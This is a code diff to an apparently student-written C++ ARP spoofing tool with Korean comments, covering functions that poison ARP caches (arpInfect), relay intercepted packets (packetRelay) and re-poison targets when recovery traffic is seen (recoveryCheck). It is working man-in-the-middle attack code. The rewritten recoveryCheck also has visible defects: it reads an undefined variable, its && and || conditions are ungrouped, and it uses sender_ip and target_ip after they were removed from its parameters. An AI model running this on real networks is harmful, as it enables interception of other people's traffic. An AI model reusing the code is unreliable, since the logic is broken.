@@ -54,7 +54,7 @@ void arpInfect(pcap_t *handle, Mac my_mac, Mac sender_mac, const char* sender_ip
     packet.arp_.pro_ = htons(EthHdr::Ip4);
     packet.arp_.hln_ = Mac::SIZE;
     packet.arp_.pln_ = Ip::SIZE;
-    packet.arp_.op_ = htons(ArpHdr::Request);
+    packet.arp_.op_ = htons(ArpHdr::Request); //Reply가 아니라 Request로 감염시킨다.
     packet.arp_.smac_ = my_mac;
     packet.arp_.sip_ = htonl(Ip(target_ip));
     packet.arp_.tmac_ = sender_mac;
@@ -67,7 +67,7 @@ void arpInfect(pcap_t *handle, Mac my_mac, Mac sender_mac, const char* sender_ip
 }
 
 // IP패킷 Relay 해주는 function
-void packetRelay(pcap_t *handle, Mac my_mac, Mac target_mac, Mac sender_mac, const char* sender_ip, const char* target_ip)
+void packetRelay(pcap_t *handle, Mac my_mac, Mac sender_mac, Mac target_mac, const char* sender_ip, const char* target_ip)
 {
     struct pcap_pkthdr *header;
     const u_char *response;
@@ -118,65 +118,41 @@ void packetRelay(pcap_t *handle, Mac my_mac, Mac target_mac, Mac sender_mac, con
             }
         } 
         else if (pcap_next_res == -1 || pcap_next_res == -2) {
-            printf("Error or Timeout reading the response: %s\n", pcap_geterr(handle));
+            fprintf(stderr, "Error or Timeout reading the response: %s\n", pcap_geterr(handle));
         }
     }
 }
 
-void recover_check(pcap_t *handle,Mac my_mac, Mac target_mac, Mac sender_mac, const char* sender_ip, const char* target_ip)
+// Recovery 상황에서의 ARP Infect function
+void recoveryCheck(pcap_t *handle, Mac my_mac, Mac sender_mac, Mac target_mac)
 {
-        struct pcap_pkthdr *header;
-        const u_char *response;
+    struct pcap_pkthdr *header;
+    const u_char *response;
 
-        sender_mac.printMac();
-        fflush(stdout);
-
-        target_mac.printMac();
-        fflush(stdout);
-
-
-        while (true) {
-                int pcap_next_res = pcap_next_ex(handle, &header, &response);
+    while (true) {
+        int pcap_next_res = pcap_next_ex(handle, &header, &response);
     
-                if (pcap_next_res == 1) {
-                        EthArpPacket *recv_packet = (EthArpPacket *)response; 
+        if (pcap_next_res == 1) {
 
-     
-                if (ntohs(recv_packet->eth_.type_) == EthHdr::Arp && (recv_packet->eth_.smac_ == sender_mac) &&(recv_packet->eth_.dmac_==Mac("ff:ff:ff:ff:ff:ff"))) {
-                        printf("this is sender's broadcast");
-                        recv_packet->eth_.smac_.printMac();
-                        fflush(stdout);
-                        arp_attack(handle, my_mac,sender_mac, sender_ip, target_ip); 
-                        }
-                         
-		else if(ntohs(recv_packet->eth_.type_) == EthHdr::Arp && (recv_packet->eth_.smac_ == target_mac) && (recv_packet->eth_.dmac_ == Mac("ff:ff:ff:ff:ff:ff"))) {
-                        printf("this is target's broadcast");
-                        recv_packet->eth_.smac_.printMac();
-                        fflush(stdout);
-                        arp_attack(handle, my_mac, sender_mac, sender_ip, target_ip);
-                        }
-		else if(ntohs(recv_packet->eth_.type_) == EthHdr::Arp && (recv_packet->eth_.smac_ == sender_mac) && (recv_packet->eth_.dmac_ == my_mac)){
-			printf("this is sender's unicast");
-			recv_packet->eth_.smac_.printMac();
-			fflush(stdout);
-                        arp_attack(handle, my_mac, sender_mac, sender_ip, target_ip);
-                }
-		else if(ntohs(recv_packet->eth_.type_) == EthHdr::Arp && (recv_packet->eth_.smac_ == target_mac) && (recv_packet->eth_.dmac_ == my_mac))
-                {
-			printf("this is target's unicast");
-                        recv_packet->eth_.smac_.printMac();
-			fflush(stdout);
-			arp_attack(handle, my_mac, target_mac, target_ip, sender_ip);
-                	
-		}
-                
-
-                }
-
-                else if (pcap_next_res == -1 || pcap_next_res == -2) {
-                printf("Error or Timeout reading the response: %s\n", pcap_geterr(handle));
+            EthArpPacket *recv_packet = (EthArpPacket *)response; 
             
+            /* 
+            Case1: Sender의 브로드캐스트(ARP Req)
+            Case2: Target의 브로드캐스트(ARP Req)
+            Case3: Sender의 유니캐스트(ARP Req)
+            Case4: Target의 유니캐스트(ARP Req)
+            -> 4가지 Case의 공통점은 Arp Req패킷이라는 점과 smac이 sender의 Mac이거나 target의 Mac이라는 것이다.*/
+            
+            if (ntohs(recv_packet->eth_.type_) == EthHdr::Arp && ntohs(packet.arp_.op_)== ArpHdr::Request && 
+            (recv_packet->eth_.smac_ == sender_mac) || (recv_packet->eth_.smac_ == target_mac)){
+                fprintf(stderr, "Detect ARP Recovery");
+                arpInfect(handle, my_mac,sender_mac, sender_ip, target_ip);
+                arpInfect(handle, my_mac,target_mac, target_ip, sender_ip);
+            }
         }
-        }
-        
+
+        else if (pcap_next_res == -1 || pcap_next_res == -2) {
+            fprintf(stderr, "Error or Timeout reading the response: %s\n", pcap_geterr(handle));
+            }
+    }     
 }
